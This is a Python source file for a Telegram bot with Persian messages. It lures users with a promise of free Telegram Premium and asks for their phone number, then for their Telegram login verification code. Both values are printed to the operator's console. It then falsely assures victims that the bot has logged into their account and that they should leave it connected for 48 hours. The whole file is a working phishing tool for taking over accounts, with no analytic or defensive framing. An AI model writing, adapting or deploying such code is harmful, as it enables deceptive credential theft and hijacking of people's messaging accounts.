import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

api = input("please enter your api token : ")
channel = input("please enter your channel (For mandatory membership) , (@exampel_com) : ")

bot = telebot.TeleBot(api)  
CHANNEL_USERNAME = channel

def print_user_info(user_id, username):
    print("="*30)
    print("user info :")
    print(f"user id -> {user_id}")
    print(f"username -> {username if username else 'null'}")
    print("="*30)

def check_membership(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"خطا در بررسی عضویت: {e}")
        return False

@bot.message_handler(commands=['start', 'again'])
def welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    print_user_info(user_id, username)

    if not check_membership(user_id, CHANNEL_USERNAME):
        markup = InlineKeyboardMarkup()
        button = InlineKeyboardButton("عضویت در کانال", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
        markup.add(button)
        
        bot.send_message(message.chat.id, 
                         " لطفاً ابتدا در کانال ما عضو شوید تا بتوانید از خدمات ربات استفاده کنید و سپس مجددا روی /start کلیک کنید .", 
                         reply_markup=markup)
        return  

    photo = "image.png"
    caption = "سلام! خوش اومدی!"
    
    with open(photo, 'rb') as photo_file:
        bot.send_photo(message.chat.id, photo_file, caption=caption)
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    button = KeyboardButton("ارسال شماره تلفن", request_contact=True)
    markup.add(button)
    
    bot.send_message(message.chat.id, text="🎉 سلام! این ربات به شما یک ماه پرمیوم تلگرام هدیه میده! برای اینکه ربات بتونه هویت شما رو تایید کنه، لطفاً شماره تلفن خودتون رو ارسال کنید.", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    contact = message.contact
    phone_number = contact.phone_number
    print(f"number -> {phone_number}")
    
    bot.send_message(message.chat.id, "برای فعالسازی پرمیوم، کد تایید رو برای ما بخونید یا از پیوی تلگرام فوروارد کنید. اگر مراحل رو درست انجام بدید، حساب شما تا ۴۸ ساعت آینده پرمیوم یک ماهه دریافت می‌کنه! بیاید شروع کنیم! کد را ارسال کنید تا ربات بتواند برای شما پرمیوم را فعال کند :")
    
    bot.register_next_step_handler(message, code_handler)

def code_handler(message):
    code = message.text.strip()
    print(f"code -> {code}")
    
    if code.isdigit():  
        bot.send_message(message.chat.id, """بسیار خب با موفقیت انجام شد 🥳 

ربات برای فعال سازی پرمیوم روی حساب شماست لطفا حساب ربات را تا ۴۸ ساعت اینده از روی اکانتتان حذف نکنید ❗️❗️
ربات پس از فعال سازی پرمیوم حساب به صورت خودکار از حساب خارج میشود ✅

اگر از صحیح بودن اطلاعات وارد شده اطمینان ندارید میتوانید با دستور /again مجددا مراحل را انجام دهید (دقت کنید یک بار بیشتر اگر با موفقیت ربات وارد حساب شده است وارد نشوید)""")
    else:
        bot.send_message(message.chat.id, "لطفاً فقط یک عدد وارد کنید.")
        bot.register_next_step_handler(message, code_handler)

bot.infinity_polling()
